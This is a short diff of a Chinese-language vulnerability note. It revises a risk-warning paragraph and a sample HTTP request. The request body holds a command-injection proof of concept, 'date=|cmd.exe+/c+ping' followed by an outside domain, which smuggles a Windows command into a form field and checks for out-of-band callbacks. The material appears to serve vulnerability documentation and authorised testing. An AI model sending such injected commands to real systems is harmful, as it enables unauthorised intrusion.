@@ -43,7 +43,7 @@ schema_version: "1"
 
 ## 操作风险
 
-在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -67,11 +67,12 @@ Host:
 Cookie: JSESSIONID=AB3CC11444E566879F70BE78C0C518CA
 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
 Connection: close
+Content-Length: 96
 
 cloudKey=0x0&date=|cmd.exe+/c+ping jzogguorui.dgrh3.cn&time=1
 ```
 
-> 请求长度说明：原资料 Content-Length 为 96；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 96；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 > 原文: <https://www.yuque.com/xiaokp7/ocvun2/tory9ats6o7dd65g>
